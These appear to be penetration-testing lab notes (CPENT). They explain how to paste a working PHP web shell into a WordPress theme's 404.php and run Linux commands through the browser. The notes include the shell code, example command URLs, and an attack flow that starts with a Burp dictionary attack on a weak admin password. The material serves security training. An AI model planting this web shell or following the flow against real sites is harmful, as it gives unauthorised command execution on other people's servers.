# PHP Web Shell (CPENT Lab Notes)

## Objective

Upload a simple **PHP Web Shell** into **404.php** to execute Linux commands through the browser.

---

## PHP Web Shell Code

```php
<?php
if(isset($_REQUEST["cmd"])){
    echo "<pre>";
    $cmd = $_REQUEST["cmd"];
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

---

## How it Works

```text
Browser
      │
?cmd=whoami
      │
      ▼
404.php
      │
system("whoami")
      │
      ▼
Linux Server
      │
      ▼
Output in Browser
```

---

## Code Explanation

| Code | Purpose |
|------|---------|
| `$_REQUEST["cmd"]` | Reads the command from the URL. |
| `system($cmd)` | Executes the command on the Linux server. |
| `echo "<pre>"` | Displays output in a readable format. |
| `die;` | Stops further PHP execution. |

---

## Example

### URL

```text
http://target/wp-content/themes/twentyfifteen/404.php?cmd=whoami
```

### Command Executed

```bash
whoami
```

### Output

```text
www-data
```

**Meaning:** The web server is running as the **www-data** user.

---

## Useful Commands

| URL Parameter | Purpose |
|--------------|---------|
| `?cmd=whoami` | Shows the current Linux user |
| `?cmd=id` | Displays user and group IDs |
| `?cmd=pwd` | Shows the current directory |
| `?cmd=ls` | Lists files |
| `?cmd=ls -la` | Lists all files with details |

---

## Why 404.php?

- Editable through **Appearance → Theme Editor**
- Executes PHP code
- Can be used as a **Web Shell** entry point

---

## Attack Flow

```text
Weak Password
      ↓
Burp Dictionary Attack
      ↓
Admin Login
      ↓
Appearance → Theme Editor
      ↓
404.php
      ↓
Paste PHP Web Shell
      ↓
Update File
      ↓
Visit:
404.php?cmd=<command>
      ↓
Execute Linux Commands
```

---

## Key Points

- `$_REQUEST` → Gets the command from the URL.
- `system()` → Executes the command on the Linux server.
- `404.php` → Used to upload the web shell.
- Output is displayed directly in the browser.
- `www-data` is the default Linux user for Apache on Ubuntu/Debian systems.
